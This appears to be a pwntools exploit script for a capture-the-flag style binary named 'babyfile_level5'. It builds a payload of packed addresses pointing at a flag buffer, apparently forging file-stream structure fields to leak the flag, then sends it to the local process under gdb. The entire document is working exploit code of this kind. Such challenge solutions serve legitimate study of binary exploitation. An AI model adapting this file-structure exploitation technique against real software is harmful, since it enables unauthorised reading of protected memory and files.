from pwn import *

# Set up connection
p = process('./babyfile_level5')

flag_addr = 0x4040c0


offset_to_write_base = 0x20



payload = p64(0x800)
payload += p64(flag_addr)
payload += p64(flag_addr)
payload += p64(flag_addr)
payload += p64(flag_addr)              
payload += p64(flag_addr + 0x200)       

gdb.attach(p, '''s''')

p.sendline(payload)

p.interactive()
